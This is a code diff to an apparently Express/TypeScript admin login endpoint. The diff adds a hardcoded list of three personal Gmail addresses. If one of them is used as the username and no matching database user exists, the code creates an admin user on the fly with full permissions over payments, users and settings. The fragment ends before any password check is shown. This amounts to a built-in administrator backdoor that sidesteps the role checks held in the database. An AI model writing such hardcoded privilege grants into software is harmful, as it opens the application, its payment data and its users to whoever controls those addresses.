@@ -199,10 +199,21 @@ app.post("/api/admin/login", (req, res) => {
   }
   
   // 2. Check Database Users with admin/moderator roles
-  const user = db.users?.find((u: any) => 
+  let user = db.users?.find((u: any) => 
     (u.userName?.toLowerCase() === username?.toLowerCase() || u.email?.toLowerCase() === username?.toLowerCase()) &&
     (u.role === "admin" || u.role === "moderator")
   );
+
+  const adminEmails = ["shahinkhan28r@gmail.com", "shahinkhan28uu@gmail.com", "shahinkhan28ddd@gmail.com"];
+  if (!user && username && adminEmails.includes(username.toLowerCase())) {
+    user = {
+      id: "u_fallback_admin_" + Date.now(),
+      userName: username.split("@")[0],
+      email: username,
+      role: "admin",
+      permissions: ["dashboard", "videos", "categories", "comments", "payments", "ads", "users", "offers", "settings"]
+    };
+  }
 
   if (user) {
     const newHistory = {
